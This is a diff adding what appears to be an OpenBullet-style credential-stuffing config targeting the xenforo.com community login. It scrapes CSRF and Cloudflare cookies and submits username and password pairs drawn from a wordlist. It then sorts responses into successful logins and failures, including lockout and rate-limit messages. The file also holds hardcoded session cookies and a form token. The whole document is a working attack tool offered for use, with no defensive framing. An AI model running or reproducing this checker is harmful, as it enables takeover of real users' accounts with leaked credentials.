@@ -1,0 +1,64 @@
+[SETTINGS]
+{
+  "Name": "Xenforo",
+  "SuggestedBots": 1,
+  "LastModified": "2019-06-27T21:45:41.5791589+02:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://xenforo.com/community/login/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<COOKIES(__cfduid)>" LR "" "" -> VAR "cfduid" 
+PARSE "<COOKIES(xf_csrf)>" LR "" "" -> VAR "csrf" 
+REQUEST POST "https://xenforo.com/community/login/login" 
+  CONTENT "login=<USER>&password=<PASS>&remember=1&_xfRedirect=&_xfToken=1561663385%2Cfeb911a967ed8667a0d7d3a6c93c559f" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "__cfduid: <cfduid>;" 
+  COOKIE "_ga: GA1.2.799552872.1561642292;" 
+  COOKIE "_gid: GA1.2.1471839345.1561642292;" 
+  COOKIE "__utma: 123000322.799552872.1561642292.1561661921.1561661921.1;" 
+  COOKIE "__utmb: 123000322.13.10.1561661921;" 
+  COOKIE "__utmc: 123000322;" 
+  COOKIE "__utmz: 123000322.1561661921.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); xfs_session: 5271c24ea5b87b3aec028d2d83c13ca2;" 
+  COOKIE "xf_csrf: <csrf>;" 
+  COOKIE "xf_session: BAPo9jgfxtyLVVXy2wYkwM4bXGwSPaXW;" 
+  COOKIE "_gat_gtag_UA_10855523_4: 1;" 
+  HEADER "Host: xenforo.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: sv-SE,sv;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Referer: https://xenforo.com/community/lost-password/requested" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Post thread" 
+    KEY "Log out" 
+  KEYCHAIN Failure OR 
+    KEY "too many" 
+    KEY "Incorrect password" 
+    KEY "No customer could be found" 
+    KEY "temporarily been locked" 
